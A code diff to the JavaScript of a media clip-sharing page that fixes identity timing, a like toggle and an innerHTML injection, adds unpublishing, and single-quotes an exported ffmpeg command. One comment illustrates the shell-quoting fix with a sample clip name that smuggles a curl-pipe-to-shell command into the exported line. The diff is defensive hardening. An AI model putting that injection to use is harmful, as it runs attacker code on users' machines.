@@ -238,7 +238,7 @@
       sortTime: $('sort-time'), sortLikes: $('sort-likes'),
     };
 
-    function init() {
+    async function init() {
       const params = new URLSearchParams(location.search);
       filePath = params.get('file') || '';
       fileKey = params.get('key') || '';
@@ -251,11 +251,15 @@
 
       isAudio = (fileType === 'audio');
       loadLocalData();
-      checkIdentity();
-      loadProxies();
       setupEvents();
-      loadSharedClips();
+      loadProxies();
       renderAll();
+      // Must finish before the shared list renders: renderShared decides the
+      // "我的"/delete affordance from `identity`, and clicking ❤️ or 🚩 while it
+      // is still null opens the identity dialog — confirming there used to mint
+      // a second id and strand every clip this person already owned.
+      await checkIdentity();
+      loadSharedClips();
     }
 
     // ── Local data ──
@@ -309,8 +313,9 @@
 
       if (options.length > 1) {
         el.proxySelector.hidden = false;
-        el.proxySelect.innerHTML = options.map((o, i) =>
-          `<option value="${i}">${o.label}</option>`).join('');
+        // Built with DOM APIs, not innerHTML: the label is stored text and would
+        // otherwise be parsed as markup on this public page.
+        el.proxySelect.replaceChildren(...options.map((o, i) => new Option(o.label, String(i))));
         el.proxySelect.onchange = () => switchSource(options[parseInt(el.proxySelect.value)]);
       } else {
         el.proxySelector.hidden = true;
@@ -525,12 +530,13 @@
         if (c.is_featured) { const b = document.createElement('span'); b.className = 'badge badge-featured'; b.textContent = '精选'; card.appendChild(b); }
         const acts = document.createElement('div'); acts.className = 'clip-card-actions';
         const loadBtn = mkBtn('📥', '加载到工作区', () => setWorkspace(c.start_time, c.end_time));
-        const likeBtn = mkBtn('❤️', '赞', function(){ toggleLike(c.id, this); });
+        const likeBtn = mkBtn(c.liked ? '💖' : '🤍', c.liked ? '取消赞' : '赞', function(){ toggleLike(c, this); });
         const dlBtn = mkBtn('⬇', '导出', () => showExport(c));
         const rptBtn = mkBtn('🚩', '举报', () => reportClip(c.id));
         if (identity && c.identity === identity.id) {
+          const hideBtn = mkBtn('🔒', '取消公开（转为私密）', () => unpublishClip(c.id));
           const delBtn = mkBtn('🗑', '删除', () => deleteOwnSharedClip(c.id)); delBtn.style.color = '#C0392B';
-          acts.append(loadBtn, likeBtn, dlBtn, rptBtn, delBtn);
+          acts.append(loadBtn, likeBtn, dlBtn, rptBtn, hideBtn, delBtn);
           const own = document.createElement('span'); own.className = 'badge badge-own'; own.textContent = '我的'; card.appendChild(own);
         } else { acts.append(loadBtn, likeBtn, dlBtn, rptBtn); }
         card.append(nm, tm, meta, acts); return card;
@@ -538,12 +544,15 @@
     }
     function mkBtn(text, title, handler) { const b = document.createElement('button'); b.textContent = text; b.title = title; b.addEventListener('click', handler); return b; }
 
-    async function toggleLike(clipId, btn) {
+    // `c.liked` comes from the server (it knows the caller's identity), so the
+    // direction is decided up front. Probing with a DELETE and retrying on 404
+    // never worked: unlike always answers 200, so the POST branch was dead.
+    async function toggleLike(c, btn) {
       if (!ensureIdentity()) return; btn.disabled = true;
       try {
-        let resp = await fetch('/api/clips/'+encodeURIComponent(clipId)+'/like', {method:'DELETE'});
-        if (resp.status === 404) resp = await fetch('/api/clips/'+encodeURIComponent(clipId)+'/like', {method:'POST'});
+        const resp = await fetch('/api/clips/'+encodeURIComponent(c.id)+'/like', { method: c.liked ? 'DELETE' : 'POST' });
         if (resp.ok) loadSharedClips();
+        else if (resp.status === 401) { identity = null; ensureIdentity(); }
       } catch (_) {} finally { btn.disabled = false; }
     }
     async function reportClip(clipId) {
@@ -553,6 +562,17 @@
         const resp = await fetch('/api/clips/'+encodeURIComponent(clipId)+'/report', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({reason:reason||''})});
         if (resp.ok) alert('已提交举报，管理员将审核处理。'); else alert('举报失败，请重试。');
       } catch (_) { alert('网络错误，请重试。'); }
+    }
+    // Pull a clip back out of the shared area without destroying it — the
+    // counterpart to 公开发布. It stays in D1 with is_public = 0.
+    async function unpublishClip(clipId) {
+      if (!confirm('取消公开此切片？它将从共享区消失，但不会被删除。')) return;
+      try {
+        const resp = await fetch('/api/clips/'+encodeURIComponent(clipId), {
+          method:'PATCH', headers:{'Content-Type':'application/json'}, body:JSON.stringify({is_public:false}),
+        });
+        if (resp.ok) loadSharedClips(); else alert('操作失败。');
+      } catch (_) { alert('网络错误。'); }
     }
     async function deleteOwnSharedClip(clipId) {
       if (!confirm('确认删除此公开切片？')) return;
@@ -568,11 +588,17 @@
     }
 
     // ── Export ──
+    // The generated line is meant to be pasted into a shell, and clip names come
+    // from other people's public clips. Double quotes do not contain `"` or `$`,
+    // so a clip named `x"; curl evil|sh; "` would run on the reader's machine.
+    // Single-quote everything: inside '…' the shell expands nothing, and the
+    // only escape needed is for a literal quote.
+    function shq(s) { return "'" + String(s).replace(/'/g, "'\\''") + "'"; }
     function showExport(clip) {
       const start = clip.start_time || clip.startTime || 0;
       const duration = (clip.end_time || clip.endTime || 0) - start;
       const name = (clip.name || 'clip') + (isAudio ? '.mp3' : '.mp4');
-      const cmd = `ffmpeg -ss ${start} -i "${location.origin}/api/file/${encodePath(fileKey)}" -t ${duration.toFixed(1)} -c copy "${name}"`;
+      const cmd = `ffmpeg -ss ${Number(start).toFixed(1)} -i ${shq(location.origin + '/api/file/' + encodePath(fileKey))} -t ${duration.toFixed(1)} -c copy ${shq(name)}`;
       el.exportTitle.textContent = '⬇ 导出: ' + (clip.name || '片段');
       el.exportCmd.textContent = cmd; el.exportModal.hidden = false;
     }
